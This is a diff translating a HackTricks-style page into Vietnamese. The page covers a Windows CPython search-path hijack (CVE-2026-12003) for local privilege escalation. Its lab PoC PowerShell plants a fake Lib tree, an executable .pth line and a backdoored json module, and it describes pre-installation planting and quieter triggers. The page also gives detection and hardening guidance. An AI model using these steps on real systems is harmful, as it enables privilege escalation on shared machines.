@@ -1,36 +1,36 @@
-# Windows CPython Build-Landmark and `sys.path` Hijacking
+# Chiếm quyền `sys.path` qua build landmark của Windows CPython
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-A runtime may retain relative paths that were intended only for its build tree. If an installed privileged runtime resolves one of those paths into a low-privilege-writable directory, an attacker can plant the expected **build landmark** and make the runtime trust an alternative library prefix. CVE-2026-12003 is a Windows CPython example: a planted `Modules\Setup.local` can redirect the standard-library entry in `sys.path` without modifying the protected Python installation.<sup>[[1]](#references)[[2]](#references)</sup>
+Một runtime có thể giữ lại các đường dẫn tương đối vốn chỉ dành cho cây build. Nếu một runtime đã cài đặt với quyền cao phân giải một trong các đường dẫn đó thành thư mục mà người dùng có quyền thấp có thể ghi, kẻ tấn công có thể tạo **build landmark** mà runtime mong đợi và khiến runtime tin tưởng một library prefix khác. CVE-2026-12003 là một ví dụ trên Windows CPython: tạo `Modules\Setup.local` có thể chuyển hướng mục standard library trong `sys.path` mà không cần sửa đổi bản cài đặt Python được bảo vệ.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## CPython path-construction chain
+## Chuỗi tạo đường dẫn của CPython
 
-Affected Windows builds compiled `VPATH=..\..` and exposed it as `sys._vpath`. The vulnerable fallback in `Modules/getpath.py` treated `VPATH\Modules\Setup.local` as evidence that the interpreter was running from a source tree; the following data flow turns that build-time value into a runtime search-path primitive.<sup>[[1]](#references)[[2]](#references)</sup>
+Các bản build Windows bị ảnh hưởng được biên dịch với `VPATH=..\..` và hiển thị giá trị này dưới dạng `sys._vpath`. Cơ chế dự phòng dễ bị tấn công trong `Modules/getpath.py` xem `VPATH\Modules\Setup.local` là dấu hiệu cho thấy interpreter đang chạy từ cây source; luồng dữ liệu sau biến giá trị lúc build này thành một primitive để thao túng search path khi runtime hoạt động.<sup>[[1]](#references)[[2]](#references)</sup>
 
-| Stage | Derived value for `C:\Program Files\Python314\python.exe` |
+| Giai đoạn | Giá trị suy ra cho `C:\Program Files\Python314\python.exe` |
 | --- | --- |
-| Compiled build path | `VPATH=..\..` |
-| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
-| Attacker-created landmark | `C:\Modules\Setup.local` |
-| Selected `build_prefix` | `C:\` |
-| Selected standard library | `C:\Lib` |
-| Result | Attacker-controlled `C:\Lib` is appended to `sys.path` |
+| Đường dẫn build được biên dịch | `VPATH=..\..` |
+| Build landmark tại runtime | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
+| Landmark do kẻ tấn công tạo | `C:\Modules\Setup.local` |
+| `build_prefix` được chọn | `C:\` |
+| Standard library được chọn | `C:\Lib` |
+| Kết quả | `C:\Lib` do kẻ tấn công kiểm soát được thêm vào `sys.path` |
 
-The check is a fallback used when the more specific `pybuilddir.txt` beside the executable is absent or unreadable. This matters because a low-privilege user may be unable to change `C:\Program Files\Python314`, yet still be able to create new directories at `C:\`. The later privileged `python.exe` process loads Python code using its own access token.<sup>[[1]](#references)[[2]](#references)</sup>
+Phép kiểm tra này là cơ chế dự phòng, được dùng khi không có hoặc không thể đọc `pybuilddir.txt` nằm cạnh executable. Điều này quan trọng vì người dùng có quyền thấp có thể không sửa được `C:\Program Files\Python314`, nhưng vẫn có thể tạo thư mục mới tại `C:\`. Sau đó, tiến trình `python.exe` chạy với quyền cao sẽ tải mã Python bằng access token của chính nó.<sup>[[1]](#references)[[2]](#references)</sup>
 
-### Preconditions
+### Điều kiện tiên quyết
 
-Treat this as a privilege boundary only when all of these conditions hold:<sup>[[1]](#references)[[2]](#references)</sup>
+Chỉ xem đây là một ranh giới đặc quyền khi đáp ứng tất cả các điều kiện sau:<sup>[[1]](#references)[[2]](#references)</sup>
 
-- The target is an affected **Windows CPython** build; the vulnerable path logic is not a Python-language property.
-- The directory obtained by resolving `..\..` from the directory containing `python.exe` permits a less-privileged user to create the landmark and `Lib` tree.
-- A higher-privileged user, service, installer, or software-deployment account later starts that interpreter.
-- No path-isolation configuration overrides the vulnerable discovery path.
+- Mục tiêu là bản build **Windows CPython** bị ảnh hưởng; logic đường dẫn dễ bị tấn công không phải là thuộc tính của ngôn ngữ Python.
+- Thư mục thu được khi phân giải `..\..` từ thư mục chứa `python.exe` cho phép người dùng có ít quyền hơn tạo landmark và cây `Lib`.
+- Người dùng có quyền cao hơn, service, installer hoặc tài khoản triển khai phần mềm sau đó khởi chạy interpreter này.
+- Không có cấu hình path-isolation nào ghi đè đường dẫn dò tìm dễ bị tấn công.
 
-## Enumeration
+## Liệt kê
 
-Inspect both the compiled value and the effective search path. An exposed `..\..` value is a useful lead, but it is not proof of exploitability: also resolve the path, test ACLs, and confirm that a planted landmark would be outside the protected installation.<sup>[[1]](#references)[[2]](#references)</sup>
+Kiểm tra cả giá trị được biên dịch lẫn search path thực tế. Giá trị `..\..` hiển thị được là một manh mối hữu ích, nhưng chưa đủ để chứng minh có thể khai thác: hãy phân giải đường dẫn, kiểm tra ACL và xác nhận rằng landmark được tạo sẽ nằm ngoài bản cài đặt được bảo vệ.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```powershell
 python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"
@@ -41,11 +41,11 @@ $prefix
 icacls $prefix
 ```
 
-Do not restrict the assessment to official installers. For every product that bundles `python.exe`, resolve its `sys._vpath` relative to the actual executable directory and review the ACLs on the resulting `Modules` and `Lib` locations. A deeper installation path may resolve to a different writable application or vendor directory instead of `C:\`.<sup>[[1]](#references)</sup>
+Không giới hạn việc đánh giá ở các trình cài đặt chính thức. Với mọi sản phẩm đi kèm `python.exe`, hãy xác định `sys._vpath` tương ứng với thư mục thực tế chứa tệp thực thi, rồi kiểm tra ACL của các vị trí `Modules` và `Lib` thu được. Đường dẫn cài đặt sâu hơn có thể trỏ đến một thư mục ứng dụng hoặc nhà cung cấp khác có quyền ghi, thay vì `C:\`.<sup>[[1]](#references)</sup>
 
-## Lab exploitation workflow
+## Quy trình khai thác trong lab
 
-The following lab PoC mirrors enough of the legitimate runtime below the selected prefix for Python to initialize, adds an executable `.pth` line, and finally creates the landmark. Create the payload before the landmark to avoid leaving the interpreter temporarily pointed at an incomplete library tree.<sup>[[1]](#references)</sup>
+PoC trong lab sau đây tái tạo đủ cấu trúc runtime hợp lệ bên dưới prefix đã chọn để Python khởi tạo, thêm một dòng `.pth` có thể thực thi, rồi cuối cùng tạo landmark. Hãy tạo payload trước landmark để tránh khiến interpreter tạm thời trỏ đến một cây thư viện chưa hoàn chỉnh.<sup>[[1]](#references)</sup>
 
 ```powershell
 $pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
@@ -59,28 +59,28 @@ New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
 New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
 ```
 
-During normal site initialization, Python processes `.pth` files in recognized site-packages directories. Only lines beginning with `import` followed by whitespace are executed, and the executable statement must stay on one physical line; `python -S` suppresses the automatic `site` import and therefore this trigger.<sup>[[1]](#references)[[4]](#references)</sup>
+Trong quá trình khởi tạo site thông thường, Python xử lý các tệp `.pth` trong những thư mục site-packages được nhận diện. Chỉ các dòng bắt đầu bằng `import` theo sau là khoảng trắng mới được thực thi, và câu lệnh có thể thực thi phải nằm trên một dòng vật lý; `python -S` ngăn việc tự động import `site`, do đó vô hiệu hóa trigger này.<sup>[[1]](#references)[[4]](#references)</sup>
 
-### Import-triggered alternative
+### Phương án thay thế kích hoạt bởi import
 
-Startup execution is not required. After reproducing the legitimate library tree, backdoor a module that a privileged script predictably imports. For example, adding code to the planted `Lib\json\__init__.py` executes when the victim imports `json`; choosing a reliable but not universally imported module can make the trigger less noisy.<sup>[[1]](#references)</sup>
+Không bắt buộc phải thực thi khi khởi động. Sau khi tái tạo cây thư viện hợp lệ, hãy cài backdoor vào một module mà script có đặc quyền dự kiến sẽ import. Ví dụ, thêm code vào `Lib\json\__init__.py` đã được cài sẽ thực thi khi nạn nhân import `json`; chọn một module đáng tin cậy nhưng không được import phổ biến có thể giúp trigger ít gây chú ý hơn.<sup>[[1]](#references)</sup>
 
 ```powershell
 'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
   Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
 ```
 
-This variant still inherits the importing process token, but it depends on the target application importing the modified module. Preserve the original module behavior when testing real software or the import may fail before the intended privileged workflow completes.<sup>[[1]](#references)</sup>
+Biến thể này vẫn kế thừa token của tiến trình import, nhưng phụ thuộc vào việc ứng dụng mục tiêu import module đã sửa đổi. Khi kiểm thử phần mềm thực tế, hãy giữ nguyên hành vi của module gốc; nếu không, thao tác import có thể thất bại trước khi quy trình đặc quyền dự kiến hoàn tất.<sup>[[1]](#references)</sup>
 
-## Pre-installation planting
+## Gieo mầm trước khi cài đặt
 
-Search-path planting can precede installation. A low-privilege user can prepare the future `Lib` tree and `Modules\Setup.local`, then wait for a privileged software portal, help-desk workflow, or deployment system to perform an all-users installation. Installers that launch the new interpreter to install packages or precompile the standard library can trigger the payload under the deployment account without an administrator manually opening Python.<sup>[[1]](#references)</sup>
+Có thể gieo mầm vào search path trước khi cài đặt. Người dùng có quyền thấp có thể chuẩn bị cây `Lib` và `Modules\Setup.local` sẽ được tạo sau đó, rồi chờ một cổng phần mềm có đặc quyền, quy trình hỗ trợ kỹ thuật hoặc hệ thống triển khai thực hiện cài đặt cho tất cả người dùng. Các trình cài đặt khởi chạy interpreter mới để cài package hoặc biên dịch trước standard library có thể kích hoạt payload dưới tài khoản triển khai mà không cần quản trị viên mở Python theo cách thủ công.<sup>[[1]](#references)</sup>
 
-This also changes deployment review: inspect writable ancestors and pre-existing landmark/library directories **before** installing or upgrading a bundled runtime, rather than checking only the final installation directory after deployment.<sup>[[1]](#references)</sup>
+Điều này cũng làm thay đổi quy trình rà soát triển khai: hãy kiểm tra các thư mục cha có quyền ghi và các thư mục landmark/library đã tồn tại **trước khi** cài đặt hoặc nâng cấp runtime đi kèm, thay vì chỉ kiểm tra thư mục cài đặt cuối cùng sau khi triển khai.<sup>[[1]](#references)</sup>
 
-## Detection and hardening
+## Phát hiện và củng cố bảo mật
 
-Useful host pivots are the unexpected landmark and library tree, followed by a privileged Python launch. Hunt for `Modules\Setup.local`, root-level or otherwise out-of-place `Lib\site-packages\*.pth`, copied standard-library packages, and module files whose owner or creation time differs from the protected installation. Correlate their creation by a standard user with elevated `python.exe` spawning `cmd.exe`, `powershell.exe`, account-management tools, or other unusual children.<sup>[[1]](#references)</sup>
+Các điểm cần kiểm tra trên máy chủ gồm landmark và cây library bất thường, tiếp theo là việc khởi chạy Python với đặc quyền. Tìm `Modules\Setup.local`, `Lib\site-packages\*.pth` ở thư mục gốc hoặc vị trí bất thường khác, các package standard library được sao chép, và các file module có chủ sở hữu hoặc thời điểm tạo khác với bản cài đặt được bảo vệ. Đối chiếu thời điểm chúng được tạo bởi người dùng thông thường với việc `python.exe` chạy bằng quyền nâng cao tạo tiến trình con như `cmd.exe`, `powershell.exe`, công cụ quản lý tài khoản hoặc các tiến trình con bất thường khác.<sup>[[1]](#references)</sup>
 
 ```powershell
 Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
@@ -90,13 +90,12 @@ Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
   Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
 ```
 
-The upstream fix removes the `VPATH\Modules\Setup.local` fallback and makes `pybuilddir.txt` the sole build-tree indicator. Prefer a fixed build or a per-user installation managed with the current Python install manager. Where upgrading is temporarily impossible, protect the resolved ancestor and pre-create `Modules` with restrictive ACLs; controlled `._pth` files or `PYTHONHOME` can also alter discovery, but require application compatibility testing.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+Bản sửa upstream loại bỏ fallback `VPATH\Modules\Setup.local` và dùng `pybuilddir.txt` làm chỉ dấu duy nhất cho build tree. Ưu tiên dùng bản build cố định hoặc bản cài đặt theo từng người dùng được quản lý bằng Python install manager hiện tại. Nếu tạm thời chưa thể nâng cấp, hãy bảo vệ thư mục tổ tiên đã phân giải và tạo trước `Modules` với ACL hạn chế; các tệp `._pth` được kiểm soát hoặc `PYTHONHOME` cũng có thể thay đổi cơ chế tìm kiếm, nhưng cần kiểm tra tính tương thích của ứng dụng.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
 
 ## References
 
-- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking and Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
-- [2] [CPython issue #151544 - In-tree search paths can be enabled without modifying install directory](https://github.com/python/cpython/issues/151544)
-- [3] [CPython pull request #151545 - Remove the `VPATH/Modules/Setup.local` fallback](https://github.com/python/cpython/pull/151545)
-- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
-
+- [1] [Bishop Fox - CVE-2026-12003: Chiếm quyền đường dẫn tìm kiếm Windows CPython và leo thang đặc quyền cục bộ](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
+- [2] [Sự cố CPython #151544 - Có thể bật đường dẫn tìm kiếm trong cây mã nguồn mà không cần sửa đổi thư mục cài đặt](https://github.com/python/cpython/issues/151544)
+- [3] [Yêu cầu pull CPython #151545 - Loại bỏ fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
+- [4] [Tài liệu Python - Tệp cấu hình đường dẫn `site`](https://docs.python.org/3/library/site.html)
 {{#include ../../../banners/hacktricks-training.md}}
